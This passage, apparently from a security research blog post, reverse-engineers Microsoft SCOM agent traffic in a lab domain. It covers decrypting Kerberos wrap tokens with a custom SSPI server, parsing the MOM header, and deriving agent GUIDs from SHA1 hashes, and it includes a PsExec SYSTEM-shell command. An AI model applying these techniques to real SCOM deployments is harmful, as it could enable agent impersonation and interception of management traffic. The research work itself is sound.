</span></span><span class=line><span class=cl><span class=nx>using</span> <span class=p>(</span><span class=nx>ClientContext</span> <span class=nx>client</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ClientContext</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=nx>clientCred</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>$</span><span class=s2>&#34;MSOMHSvc/{server}&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>ContextAttrib</span><span class=p>.</span><span class=nx>MutualAuth</span> <span class=o>|</span> <span class=nx>ContextAttrib</span><span class=p>.</span><span class=nx>Confidentiality</span> <span class=o>|</span> <span class=nx>ContextAttrib</span><span class=p>.</span><span class=nx>Delegate</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Initial authentication - generate AP-REQ
</span></span></span><span class=line><span class=cl>    <span class=nx>client</span><span class=p>.</span><span class=nx>Init</span><span class=p>(</span><span class=kc>null</span><span class=p>,</span> <span class=nx>out</span> <span class=kr>byte</span><span class=p>[]</span> <span class=nx>clientToken</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kr>byte</span><span class=p>[]</span> <span class=nx>apReq</span> <span class=o>=</span> <span class=nx>generate_ap_req</span><span class=p>(</span><span class=nx>clientToken</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1>// Send AP-REQ
</span></span></span><span class=line><span class=cl>    <span class=nx>networkStream</span><span class=p>.</span><span class=nx>Write</span><span class=p>(</span><span class=nx>apReq</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nx>apReq</span><span class=p>.</span><span class=nx>Length</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>networkStream</span><span class=p>.</span><span class=nx>Flush</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1>// Receive and parse AP-REP
</span></span></span><span class=line><span class=cl>    <span class=kr>byte</span><span class=p>[]</span> <span class=nx>apRep</span> <span class=o>=</span> <span class=nx>parse_ap_rep</span><span class=p>(</span><span class=nx>networkStream</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1>// Complete authentication
</span></span></span><span class=line><span class=cl>    <span class=nx>SecurityStatus</span> <span class=nx>status</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>do</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>status</span> <span class=o>=</span> <span class=nx>client</span><span class=p>.</span><span class=nx>Init</span><span class=p>(</span><span class=nx>apRep</span><span class=p>,</span> <span class=nx>out</span> <span class=nx>clientToken</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>while</span> <span class=p>(</span><span class=nx>status</span> <span class=o>==</span> <span class=nx>SecurityStatus</span><span class=p>.</span><span class=nx>ContinueNeeded</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1>// Authentication complete - context established
</span></span></span><span class=line><span class=cl>    <span class=nx>Console</span><span class=p>.</span><span class=nx>WriteLine</span><span class=p>(</span><span class=nx>$</span><span class=s2>&#34;Authenticated as: {client.ContextUserName}&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>Console</span><span class=p>.</span><span class=nx>WriteLine</span><span class=p>(</span><span class=nx>$</span><span class=s2>&#34;Session Key: {BitConverter.ToString(client.QuerySessionKey())}&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>We then ran our Kerberos SSPI server on port <em>5000/TCP</em> and connected our client.</p><p><img alt=image.png loading=lazy src=/scom/image%2016.png></p><p>After some tweaking of the message encryption parameters, we captured the below encrypted data in Wireshark.</p><p><img alt=image.png loading=lazy src=/scom/image%2017.png></p><p>This was promising, as the structure of the generated traffic and encrypted application data was almost identical to that sent by the legitimate SCOM agent below.</p><p><img alt=image.png loading=lazy src=/scom/81c064bf-831f-47f8-ba59-e5eebf27acd4.png></p><p>We say “almost” identical as there was a subtle variance in the order of the first few bytes of the Kerberos wrap tokens due to the Right Rotation Count (<a href=https://datatracker.ietf.org/doc/html/rfc4121#section-4.2.5>RRC</a>).</p><p>With the correct authentication protocol identified, we could then point the legitimate SCOM agent against our own Kerberos SSPI server. Once authentication succeeds, we can decrypt the Kerberos wrap token containing the initial agent request data.</p><p>In order for the SCOM client to authenticate via Kerberos against our SSPI server, it must be running under the security context of the account the SCOM SPN <code>MSOMHSvc</code> is registered with. We can confirm this by running the below command on our lab DC.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>C</span><span class=o>:</span><span class=err>\</span><span class=nx>Users</span><span class=err>\</span><span class=nx>domainadmin</span><span class=o>&gt;</span><span class=nx>setspn</span> <span class=o>-</span><span class=nx>Q</span> <span class=nx>MSOMHSvc</span><span class=o>/</span><span class=nx>scom</span><span class=o>-</span><span class=nx>om1</span><span class=p>.</span><span class=nx>ludus</span><span class=p>.</span><span class=nx>domain</span>
</span></span><span class=line><span class=cl><span class=nx>Checking</span> <span class=nx>domain</span> <span class=nx>DC</span><span class=o>=</span><span class=nx>ludus</span><span class=p>,</span><span class=nx>DC</span><span class=o>=</span><span class=nx>domain</span>
</span></span><span class=line><span class=cl><span class=nx>CN</span><span class=o>=</span><span class=nx>SCOM</span><span class=o>-</span><span class=nx>OM1</span><span class=p>,</span><span class=nx>OU</span><span class=o>=</span><span class=nx>Servers</span><span class=p>,</span><span class=nx>DC</span><span class=o>=</span><span class=nx>ludus</span><span class=p>,</span><span class=nx>DC</span><span class=o>=</span><span class=nx>domain</span>
</span></span><span class=line><span class=cl>        <span class=nx>WSMAN</span><span class=o>/</span><span class=nx>scom</span><span class=o>-</span><span class=nx>om1</span>
</span></span><span class=line><span class=cl>        <span class=nx>WSMAN</span><span class=o>/</span><span class=nx>scom</span><span class=o>-</span><span class=nx>om1</span><span class=p>.</span><span class=nx>ludus</span><span class=p>.</span><span class=nx>domain</span>
</span></span><span class=line><span class=cl>        <span class=nx>MSOMHSvc</span><span class=o>/</span><span class=nx>SCOM</span><span class=o>-</span><span class=nx>OM1</span>
</span></span><span class=line><span class=cl>        <span class=nx>MSOMHSvc</span><span class=o>/</span><span class=nx>scom</span><span class=o>-</span><span class=nx>om1</span><span class=p>.</span><span class=nx>ludus</span><span class=p>.</span><span class=nx>domain</span>
</span></span><span class=line><span class=cl>        <span class=nx>MSOMSdkSvc</span><span class=o>/</span><span class=nx>SCOM</span><span class=o>-</span><span class=nx>OM1</span>
</span></span><span class=line><span class=cl>        <span class=nx>MSOMSdkSvc</span><span class=o>/</span><span class=nx>scom</span><span class=o>-</span><span class=nx>om1</span><span class=p>.</span><span class=nx>ludus</span><span class=p>.</span><span class=nx>domain</span>
</span></span><span class=line><span class=cl>        <span class=nx>TERMSRV</span><span class=o>/</span><span class=nx>SCOM</span><span class=o>-</span><span class=nx>OM1</span>
</span></span><span class=line><span class=cl>        <span class=nx>TERMSRV</span><span class=o>/</span><span class=nx>scom</span><span class=o>-</span><span class=nx>om1</span><span class=p>.</span><span class=nx>ludus</span><span class=p>.</span><span class=nx>domain</span>
</span></span><span class=line><span class=cl>        <span class=nx>RestrictedKrbHost</span><span class=o>/</span><span class=nx>SCOM</span><span class=o>-</span><span class=nx>OM1</span>
</span></span><span class=line><span class=cl>        <span class=nx>HOST</span><span class=o>/</span><span class=nx>SCOM</span><span class=o>-</span><span class=nx>OM1</span>
</span></span><span class=line><span class=cl>        <span class=nx>RestrictedKrbHost</span><span class=o>/</span><span class=nx>scom</span><span class=o>-</span><span class=nx>om1</span><span class=p>.</span><span class=nx>ludus</span><span class=p>.</span><span class=nx>domain</span>
</span></span><span class=line><span class=cl>        <span class=nx>HOST</span><span class=o>/</span><span class=nx>scom</span><span class=o>-</span><span class=nx>om1</span><span class=p>.</span><span class=nx>ludus</span><span class=p>.</span><span class=nx>domain</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>Existing</span> <span class=nx>SPN</span> <span class=nx>found</span><span class=o>!</span>
</span></span></code></pre></div><p>In this instance, we need to spawn a process running as <code>scom-om1$</code>. We can achieve this by spawning a <em>SYSTEM</em> shell using PSExec on the <code>scom-om1.ludus.domain</code> host.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>C</span><span class=o>:</span><span class=err>\</span><span class=nx>Users</span><span class=err>\</span><span class=nx>domainadmin</span><span class=o>&gt;</span><span class=nx>hostname</span>
</span></span><span class=line><span class=cl><span class=nx>scom</span><span class=o>-</span><span class=nx>om1</span>
</span></span><span class=line><span class=cl><span class=nx>C</span><span class=o>:</span><span class=err>\</span><span class=nx>Users</span><span class=err>\</span><span class=nx>domainadmin</span><span class=o>&gt;</span><span class=nx>PsExec64</span><span class=p>.</span><span class=nx>exe</span> <span class=o>-</span><span class=nx>i</span> <span class=o>-</span><span class=nx>s</span> <span class=nx>cmd</span><span class=p>.</span><span class=nx>exe</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>PsExec</span> <span class=nx>v2</span><span class=mf>.43</span> <span class=o>-</span> <span class=nx>Execute</span> <span class=nx>processes</span> <span class=nx>remotely</span>
</span></span><span class=line><span class=cl><span class=nx>Copyright</span> <span class=p>(</span><span class=nx>C</span><span class=p>)</span> <span class=mi>2001</span><span class=o>-</span><span class=mi>2023</span> <span class=nx>Mark</span> <span class=nx>Russinovich</span>
</span></span><span class=line><span class=cl><span class=nx>Sysinternals</span> <span class=o>-</span> <span class=nx>www</span><span class=p>.</span><span class=nx>sysinternals</span><span class=p>.</span><span class=nx>com</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>C</span><span class=o>:</span><span class=err>\</span><span class=nx>Windows</span><span class=err>\</span><span class=nx>system32</span><span class=o>&gt;</span><span class=nx>whoami</span>
</span></span><span class=line><span class=cl><span class=nx>nt</span> <span class=nx>authority</span><span class=err>\</span><span class=nx>system</span>
</span></span></code></pre></div><p>Inside our new <em>SYSTEM</em> shell, we run our Kerberos SSPI server.</p><pre tabindex=0><code>C:\Users\DA&gt;C:\Users\DA\mydemoserver\bin\Release\mydemoserver.exe
Running as NT Authority\SYSTEM
Server listening on port 5000...
</code></pre><p>Next we re-install the SCOM agent (we can’t change the server port once the agent is installed) and point it at our SSPI server on port <em>5000/TCP</em>.</p><figure><img loading=lazy src=/scom/image%2018.png width=500></figure><p>After the agent installs, the agent will perform Kerberos authentication against our host over port <em>5000/TCP</em>. Once authentication succeeds, the agent will encrypt its initial request data and send it inside a Kerberos wrap token. On the server side, we can then decrypt the wrap token and print the contents to the console.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>C</span><span class=o>:</span><span class=err>\</span><span class=nx>Users</span><span class=err>\</span><span class=nx>DA</span><span class=err>\</span><span class=nx>mydemoserver</span><span class=err>\</span><span class=nx>bin</span><span class=err>\</span><span class=nx>Release</span><span class=err>\</span><span class=nx>mydemoserver</span><span class=p>.</span><span class=nx>exe</span>
</span></span><span class=line><span class=cl><span class=nx>Server</span> <span class=nx>authority</span><span class=o>:</span>
</span></span><span class=line><span class=cl><span class=nx>Server</span> <span class=nx>context</span> <span class=nx>user</span><span class=o>:</span> <span class=nx>LUDUS</span><span class=p>.</span><span class=nx>DOMAIN</span><span class=err>\</span><span class=nx>WIN</span><span class=o>-</span><span class=nx>SERVER$</span>
</span></span><span class=line><span class=cl><span class=nx>DEBUG</span> <span class=nx>MESSAGE</span> <span class=mi>1</span> <span class=p>(</span><span class=nx>AP</span><span class=o>-</span><span class=nx>REQ</span><span class=p>)</span><span class=o>:</span> <span class=mi>60</span><span class=o>-</span><span class=mi>82</span><span class=o>-</span><span class=mi>06</span><span class=o>-</span><span class=nx>F6</span><span class=o>-</span><span class=mi>06</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>2</span><span class=nx>A</span><span class=o>-</span><span class=mi>86</span><span class=o>-</span><span class=mi>48</span><span class=o>-</span><span class=mi>86</span><span class=o>-</span><span class=nx>F7</span><span class=o>-</span><span class=mi>12</span><span class=o>-</span><span class=mi>01</span><span class=o>-</span><span class=mi>02</span><span class=o>-</span><span class=mi>02</span><span class=o>-</span><span class=mi>01</span><span class=o>-</span><span class=mi>00</span><span class=o>-</span><span class=mi>6</span><span class=nx>E</span><span class=o>-</span><span class=mi>82</span><span class=o>-</span><span class=mi>06</span><span class=o>-</span><span class=nx>E5</span><span class=o>-</span><span class=mi>30</span><span class=o>-</span><span class=mi>82</span><span class=o>-</span><span class=mi>06</span><span class=o>-</span><span class=nx>E1</span><span class=o>-</span><span class=p>&lt;</span><span class=nt>TRIMMED_FOR_BREVITY</span><span class=p>&gt;</span> <span class=nx>size</span><span class=o>:</span> <span class=mi>1786</span>
</span></span><span class=line><span class=cl><span class=nx>SERVER</span> <span class=nx>DEBUG</span> <span class=nx>MESSAGE</span> <span class=mi>3</span> <span class=p>(</span><span class=nx>decrypted</span> <span class=nx>kerb</span> <span class=nx>wrap</span> <span class=nx>token</span><span class=p>)</span> <span class=nx>HEX</span><span class=o>:</span> <span class=mi>03</span><span class=o>-</span><span class=mi>20</span><span class=o>-</span><span class=mi>73</span><span class=o>-</span><span class=mi>19</span><span class=o>-</span><span class=mi>04</span><span class=o>-</span><span class=mi>20</span><span class=o>-</span><span class=mi>04</span><span class=o>-</span><span class=mi>20</span><span class=o>-</span><span class=mi>8</span><span class=nx>C</span><span class=o>-</span><span class=mi>00</span><span class=o>-</span><span class=mi>00</span><span class=o>-</span><span class=mi>00</span><span class=o>-</span><span class=mi>5</span><span class=nx>D</span><span class=o>-</span><span class=mi>00</span><span class=o>-</span><span class=mi>00</span><span class=o>-</span><span class=mi>00</span><span class=o>-</span><span class=mi>78</span><span class=o>-</span><span class=mi>9</span><span class=nx>C</span><span class=o>-</span><span class=mi>9</span><span class=nx>B</span><span class=o>-</span><span class=nx>E7</span><span class=o>-</span><span class=nx>AA</span><span class=o>-</span><span class=nx>C2</span><span class=o>-</span><span class=nx>C1</span><span class=o>-</span><span class=nx>C8</span><span class=o>-</span><span class=nx>C0</span><span class=o>-</span><span class=nx>C0</span><span class=o>-</span><span class=mi>50</span><span class=o>-</span><span class=mi>03</span><span class=o>-</span><span class=nx>C4</span><span class=o>-</span><span class=nx>CC</span><span class=o>-</span><span class=mi>40</span><span class=o>-</span><span class=nx>EC</span><span class=o>-</span><span class=nx>E4</span><span class=o>-</span><span class=nx>EB</span><span class=o>-</span><span class=nx>EF</span><span class=o>-</span><span class=nx>CB</span><span class=o>-</span><span class=mi>0</span><span class=nx>E</span><span class=o>-</span><span class=mi>14</span><span class=o>-</span><span class=mi>58</span><span class=o>-</span><span class=nx>DF</span><span class=o>-</span><span class=nx>EB</span><span class=o>-</span><span class=mi>55</span><span class=o>-</span><span class=mi>93</span><span class=o>-</span><span class=mi>7</span><span class=nx>C</span><span class=o>-</span><span class=nx>A0</span><span class=o>-</span><span class=mi>5</span><span class=nx>E</span><span class=o>-</span><span class=nx>CA</span><span class=o>-</span><span class=mi>42</span><span class=o>-</span><span class=mi>42</span><span class=o>-</span><span class=mi>90</span><span class=o>-</span><span class=nx>FD</span><span class=o>-</span><span class=nx>CE</span><span class=o>-</span><span class=nx>B3</span><span class=o>-</span><span class=mi>85</span><span class=o>-</span><span class=mi>1</span><span class=nx>C</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>6</span><span class=nx>C</span><span class=o>-</span><span class=mi>9</span><span class=nx>A</span><span class=o>-</span><span class=mi>0</span><span class=nx>C</span><span class=o>-</span><span class=mi>47</span><span class=o>-</span><span class=nx>E5</span><span class=o>-</span><span class=mi>37</span><span class=o>-</span><span class=mi>0</span><span class=nx>B</span><span class=o>-</span><span class=mi>0</span><span class=nx>B</span><span class=o>-</span><span class=nx>FF</span><span class=o>-</span><span class=mi>34</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=nx>BD</span><span class=o>-</span><span class=nx>D4</span><span class=o>-</span><span class=mi>7</span><span class=nx>F</span><span class=o>-</span><span class=nx>B1</span><span class=o>-</span><span class=nx>C5</span><span class=o>-</span><span class=mi>13</span><span class=o>-</span><span class=nx>A8</span><span class=o>-</span><span class=mi>8</span><span class=nx>E</span><span class=o>-</span><span class=mi>93</span><span class=o>-</span><span class=mi>01</span><span class=o>-</span><span class=mi>04</span><span class=o>-</span><span class=nx>D8</span><span class=o>-</span><span class=mi>18</span><span class=o>-</span><span class=nx>E4</span><span class=o>-</span><span class=mi>53</span><span class=o>-</span><span class=mi>18</span><span class=o>-</span><span class=mi>18</span><span class=o>-</span><span class=nx>D0</span><span class=o>-</span><span class=nx>E5</span><span class=o>-</span><span class=mi>19</span><span class=o>-</span><span class=nx>D0</span><span class=o>-</span><span class=mi>40</span><span class=o>-</span><span class=nx>C1</span><span class=o>-</span><span class=mi>94</span><span class=o>-</span><span class=nx>DB</span><span class=o>-</span><span class=mi>20</span><span class=o>-</span><span class=mi>6</span><span class=nx>B</span><span class=o>-</span><span class=mi>18</span><span class=o>-</span><span class=mi>4</span><span class=nx>A</span><span class=o>-</span><span class=nx>B8</span><span class=o>-</span><span class=mi>20</span><span class=o>-</span><span class=mi>7</span><span class=nx>C</span><span class=o>-</span><span class=mi>01</span><span class=o>-</span><span class=mi>20</span><span class=o>-</span><span class=nx>FE</span><span class=o>-</span><span class=mi>8</span><span class=nx>F</span><span class=o>-</span><span class=mi>06</span><span class=o>-</span><span class=mi>00</span><span class=o>-</span><span class=mi>61</span><span class=o>-</span><span class=mi>34</span><span class=o>-</span><span class=mi>2</span><span class=nx>A</span><span class=o>-</span><span class=mi>6</span><span class=nx>E</span>
</span></span></code></pre></div><p>This reveals to us the decrypted contents of the first message the agent sent to the SCOM server. At first glance, this doesn’t appear to be any more legible than the encrypted messages captured earlier; however, if we analyze the message structure, we identify two header bytes (<code>78 9C</code>) which indicate zlib compressed data.</p><p><img alt="Untitled Diagram-Page-13.drawio (2).png" loading=lazy src=/scom/f898578e-862f-4fc5-a533-4d028758f636.png></p><p>After decompression of the zlib data, we are presented with the below.</p><pre tabindex=0><code>00000000  9e 45 24 08 01 00 00 00  7c 00 00 00 03 00 00 00  |.E$.....|.......|
00000010  42 4d 4f 4d 07 01 00 00  31 64 9d 94 58 5b 6a a4  |BMOM....1d..X[j.|
00000020  83 ff b4 82 50 60 e7 07  80 8c 0b 1c 1f b2 2a 45  |....P`........*E|
00000030  19 77 6e a1 ed 46 c3 9c  49 4d 4f 4d 09 00 00 00  |.wn..F..IMOM....|
00000040  00 00 06 00 1f 64 00 00  80 8c 0b 1c 1f b2 2a 45  |.....d........*E|
00000050  19 77 6e a1 ed 46 c3 9c  00 00 00 00 00 00 00 00  |.wn..F..........|
00000060  00 00 00 00 00 00 00 00  ba 4f dc 01 00 00 00 00  |.........O......|
00000070  01 00 00 00 00 00 00 00  10 00 00 00 ff ff ff ff  |................|
00000080  ff ff ff ff ff ff ff ff  ff ff ff ff              |............|
0000008c
</code></pre><p>At this stage, we were really hoping for this to just be plain XML data. Instead, we discovered a proprietary network protocol SCOM used to handle agent communications. To create our client, we needed to roll up our sleeves and dive even deeper.</p><h3 id=scom-header-data-structure>SCOM Header Data Structure<a hidden class=anchor aria-hidden=true href=#scom-header-data-structure>#</a></h3><p>By reinstalling the agent and decrypting the initial message the server received each time, we started to observe certain patterns within the message data.</p><p>Prepended to each message, we saw a consistent header structure outlined below. After reinstalling the agent several times on different machines and configurations, we were able to identify a set of constant values and fields related to the size of each section.</p><p><img alt=notion_1.drawio.png loading=lazy src=/scom/cb62a1cd-a2f6-4ee0-a97c-ec812246c053.png></p><h3 id=management-group-name>Management Group Name<a hidden class=anchor aria-hidden=true href=#management-group-name>#</a></h3><p>Inside the message, we observed two 16-byte values which appeared to change when we installed the agent on a different host or used a different management group name.</p><p><img alt=notion2.drawio.png loading=lazy src=/scom/09ccc424-3520-44ce-bc37-7e3f00e60552.png></p><p>Luckily for us, the SCOM server logs highly verbose entries inside the Windows event logs. Shortly after enrolling our agent, we saw the below entry.</p><p><img alt=image.png loading=lazy src=/scom/image%2019.png></p><p>This revealed that the first GUID <code>949d6431-5b58-a46a-83ff-b4825060e707</code> mapped to the Management Group Name while the second <code>1c0b8c80-b21f-452a-1977-6ea1ed46c39c</code> belonged to the Entity (Agent) ID.</p><p>To determine the origin of these two GUIDs, we searched through the decompiled the .NET server side binaries searching for references to GUID instantiation. This resulted in the discovery of the <code>GetGuidFromString</code> method of the <code>IdUtil</code> Class inside of the <code>C:\Program Files\Microsoft System Center\Operations Manager\Server\CAManaged.dll</code> DLL.</p><pre tabindex=0><code>		public static Guid GetGuidFromString(string textToHash)
		{
			SHA1 sha;
			if (!IdUtil.isFipsEnforcementEnabled)
			{
				try
				{
					sha = new SHA1Managed();
					goto IL_24;
				}
				catch (InvalidOperationException)
				{
					IdUtil.isFipsEnforcementEnabled = true;
					sha = new SHA1CryptoServiceProvider();
					goto IL_24;
				}
			}
			sha = new SHA1CryptoServiceProvider();
			IL_24:
			byte[] array2;
			using (sha)
			{
				UnicodeEncoding unicodeEncoding = new UnicodeEncoding();
				byte[] array;
				if (textToHash == null)
				{
					array = unicodeEncoding.GetBytes(&#34;&lt;null&gt;&#34;.ToString());
				}
				else
				{
					array = unicodeEncoding.GetBytes(textToHash.ToString());
				}
				array2 = sha.ComputeHash(array);
			}
			return new Guid(((int)array2[3] &lt;&lt; 24) | ((int)array2[2] &lt;&lt; 16) | ((int)array2[1] &lt;&lt; 8) | (int)array2[0], (short)(((int)array2[5] &lt;&lt; 8) | (int)array2[4]), (short)(((int)array2[7] &lt;&lt; 8) | (int)array2[6]), array2[8], array2[9], array2[10], array2[11], array2[12], array2[13], array2[14], array2[15]);
		}
</code></pre><p>Here the management server name is run through a SHA1 hash function with the resulting bytes being converted to GUID representation. We then ran our SCOM management server name <code>SCOM1</code> through this function and confirmed the resulting GUID matched the one we saw in the event logs.</p><pre tabindex=0><code>PS C:\Users\matth\Downloads&gt; .\ConsoleApp1.exe SCOM1
[+] Generating GUID from input string: SCOM1 
(949d6431-5b58-a46a-83ff-b4825060e707)
</code></pre><p>Unfortunately, this did not appear to be the same algorithm used for generating the agent ID.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl>PS C:\Users\matth\Downloads&gt; .\ConsoleApp1.exe scom-db.ludus.domain
</span></span><span class=line><span class=cl>[+] Generating GUID from input string: scom-db.ludus.domain 
</span></span><span class=line><span class=cl>(4d97e519-9b84-aa13-78bb-a1e6975db6de)
</span></span></code></pre></div><h3 id=agent-id>Agent ID<a hidden class=anchor aria-hidden=true href=#agent-id>#</a></h3><p>Searching further through the <code>IdUtil</code> Class we saw a reference to a native DLL <code>HealthServiceRuntime.dll</code> with a single exported function <code>GetLocalHealthServiceId</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl>		<span class=kr>private</span> <span class=kr>static</span> <span class=kr>class</span> <span class=nx>NativeMethods</span>
</span></span><span class=line><span class=cl>		<span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=p>[</span><span class=nx>DllImport</span><span class=p>(</span><span class=s2>&#34;HealthServiceRuntime.dll&#34;</span><span class=p>,</span> <span class=nx>CallingConvention</span> <span class=o>=</span> <span class=nx>CallingConvention</span><span class=p>.</span><span class=nx>StdCall</span><span class=p>,</span> <span class=nx>ExactSpelling</span> <span class=o>=</span> <span class=kc>true</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>			<span class=kr>public</span> <span class=kr>static</span> <span class=nx>extern</span> <span class=nx>uint</span> <span class=nx>GetLocalHealthServiceId</span><span class=p>(</span><span class=nx>out</span> <span class=nx>Guid</span> <span class=nx>localHealthServiceId</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span></code></pre></div><p>Referencing this DLL and calling this function locally on a machine with the SCOM agent installed, we saw this returned a GUID matching the <code>EntityID</code> value found in the event logs.</p><pre tabindex=0><code>PS C:\Users\matth\Downloads&gt; .\ConsoleApp2.exe
[+] Calling GetLocalHealthServiceId()
1c0b8c80-b21f-452a-1977-6ea1ed46c39c
</code></pre><p>To identify how this second GUID was generated, we attached a debugger to our process and set a breakpoint on the entry of the <code>GetLocalHealthServiceId</code> function. Stepping through this function, we saw that a call to <code>GetComputerNameExA</code> was made suggesting that the hostname was likely used to generate the unique agent GUID.</p><p><img loading=lazy src=/scom/attachment79df074069ff26a7d562c42435540d7f.png></p><p>To confirm this, we set a breakpoint before the call to <code>GetComputerNameExA</code> and manually patched the first byte of our hostname to a different value before stepping over the function call.</p><p><img loading=lazy src=/scom/attachmentb588afd8e54f1b0dc863b57d45daea3d.png></p><p>This resulted in a different GUID value being returned, confirming that the hostname was indeed being used as an input to generate the GUID.</p><p><img loading=lazy src=/scom/attachment66b83d4babcbbc3487069597e0cc4dc0.png></p><p>To identity exactly how this GUID generated, we loaded the <code>healthserviceruntime.dll</code> DLL into IDA to perform static analysis alongside our dynamic analysis inside of x64dbg.</p><blockquote><p><strong>Note</strong>: Some function names in the below output have been manually renamed inside of IDA</p></blockquote><p>Inside of the IDA decompiler view, we located the pseudocode for the exported function <code>GetLocalHealthServiceId</code> and saw a call made to subroutine <code>sub_7FFE197F1A90</code>.</p><p><img loading=lazy src=/scom/attachmentcbac5ef72ccfe96446075767b86832c1.png></p><p>This ultimately resulted in a call to <code>sub_7FFE3A471EC0</code> which captured the computer name via <code>GetComputerNameExA</code> as observed in the debugger.</p><p><img loading=lazy src=/scom/attachment3004e27a22a255288746cab8b9b2fcc2.png></p><p>After returning the local computer name, a call to subroutine <code>sub_7FFE197F10F0</code> is made passing in two static GUIDs <code>AB4C891F-3359-3FB6-0704-075FBFE36710</code> and <code>5C324096-D928-76DB-E9E7-E629DCC261B1</code> stored within the <code>healthserviceruntime.dll</code> itself.</p><p><img loading=lazy src=/scom/attachmenta908bfe31dc60bf70cf2b6032d74acaf.png></p><p>These two GUIDs are concatenated into a string with format <code>"TypeId={AB4C891F-3359-3FB6-0704-075FBFE36710},{5C324096-D928-76DB-E9E7-E629DCC261B1}="</code> and passed to another function <code>sub_7FFE3A470EA0</code> along with the returned local computer name (converted to upper case).</p><p><img loading=lazy src=/scom/attachmentb27fd553730fa2fd3c2968150e7015e6.png></p><p>This, in turn, calls <code>sub_7FFAD5DE0F60</code> with a final concatenated string containing the two GUIDs and the computer name <code>"TypeId={AB4C891F-3359-3FB6-0704-075FBFE36710},{5C324096-D928-76DB-E9E7-E629DCC261B1}=DESKTOP-PW1KCDG"</code>.</p><p>Breaking on this function in the debugger, we can see this final string passed as the first argument to <code>sub_7FFAD5DE0F60</code> with the second argument being used to store the output of this function.</p><p><img loading=lazy src=/scom/attachmenta16026f0f0b4905177b19f93362fa29c.png></p><p>Stepping over this function we indeed see that this returns the expected agent GUID.</p><p><img loading=lazy src=/scom/attachment6169e2118c4ae0152ab6008b070e00f2.png></p><p>Inside of <code>sub_7FFAD5DE0F60</code> we note one final function call to<code>sub_7FFE3A4725E0</code> before our generated GUID value returned.</p><p><img loading=lazy src=/scom/attachmentab71abf187b1ae947473c25ece26805d.png></p><p>Examining the decompiler view in IDA for function <code>sub_7FFE3A4725E0</code>, we see that a hash value is created from our input string via call to <code>CryptGetHashParam</code>.</p><p><img loading=lazy src=/scom/attachmentb98c55697ad18854e307dc4c2f416c19.png></p><p>At this stage, we speculated that this could be the same algorithm used to create a GUID from a SHA1 hash as seen in the decompiled C# code. To verify this, we ran the <code>GetGuidFromString</code> C# function providing the concatenated string as input.</p><pre tabindex=0><code>PS C:\Users\matth\Downloads&gt; .\ConsoleApp1.exe &#34;TypeId={AB4C891F-3359-3FB6-0704-075FBFE36710},{5C324096-D928-76DB-E9E7-E629DCC261B1}=DESKTOP-PW1KCDG&#34;
</code></pre><p>And confirmed that the output matched the data returned from the native DLL.</p><pre tabindex=0><code>[+] Generating GUID from input string: &#34;TypeId={AB4C891F-3359-3FB6-0704-075FBFE36710},{5C324096-D928-76DB-E9E7-E629DCC261B1}=DESKTOP-PW1KCDG&#34;
(4d97e519-9b84-aa13-78bb-a1e6975db6de)
</code></pre><h3 id=agent-timestamp>Agent Timestamp<a hidden class=anchor aria-hidden=true href=#agent-timestamp>#</a></h3><p>With knowledge of how both of the GUIDs contained in the SCOM message were generated, we moved onto the remaining unknown values. This included a value observed in each message <code>agent_nonce</code> where the low byte values appeared to shift while the high bytes remained static.</p><p><img alt=notion_3.drawio.png loading=lazy src=/scom/fb200617-bead-4872-8c03-ed9dde1fa690.png></p><p>This behaviour hinted to us that it could be some sort of time stamp. To identify the source of this value, we needed to locate the code responsible for constructing the MOM header struct. By searching for the delimiter values observed in the MOM header section <code>IMOM</code> and <code>BMOM</code> across all of the agent DLLs we observe a single hit.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=nx>mattjohnson</span><span class=err>@</span><span class=nx>mattjohnsons</span><span class=o>-</span><span class=nx>MacBook</span><span class=o>-</span><span class=nx>Pro</span> <span class=nx>Agent</span> <span class=o>%</span> <span class=nx>grep</span> <span class=p>.</span> <span class=o>-</span><span class=nx>rnwi</span> <span class=o>-</span><span class=nx>e</span> <span class=s2>&#34;BMOM&#34;</span>
